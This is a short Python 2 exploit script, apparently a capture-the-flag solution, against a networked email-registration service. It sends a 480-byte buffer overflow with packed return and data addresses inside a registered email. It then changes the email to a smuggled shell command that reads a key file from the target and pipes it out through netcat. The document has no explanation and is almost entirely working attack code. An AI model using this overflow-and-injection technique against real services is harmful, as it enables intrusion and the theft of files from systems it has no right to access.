from socket import *
import struct

s = socket(AF_INET, SOCK_STREAM)
s.connect(('10.211.55.7', 9999))

PI = lambda x: struct.pack('I', x)
PUI = lambda x: struct.unpack('I', x)[0]

def read_until(f):
    r = ''
    while f not in r:
        c = s.recv(1)
        if not c:
            break
        r += c
    return r

def until_input():
    return read_until('Input : ')

def register(email):
    s.send('1\n')
    print read_until('byte) : ')
    s.send(email + '\n')
    print until_input()

def login(email):
    s.send('2\n')
    s.send(email + '\n')
    print until_input()

def modify_email(email):
    s.send('5\n')
    raw_input()
    s.send(email + '\n')
    print email
    print until_input()
def gen_payload(num):
    assert(num % 2 == 0)
    result = ''
    for i in xrange(num / 2):
        result += "%02X" % i
    #print repr(result)
    return result

print until_input()
payload = 'a' * 480
payload += PI(0x080485A0) + "BBBB" + PI(0x0804C0A0)
payload = payload.ljust(504, "D")
payload += '\x4a\x9c'
assert(len(payload) == 506)
email1 =  payload + '@a.a'
register(email1)
login(email1)
raw_input()
email2 = 'cat /home/simple_comment/key|nc localhost 8080;@a.a'
modify_email(email2)
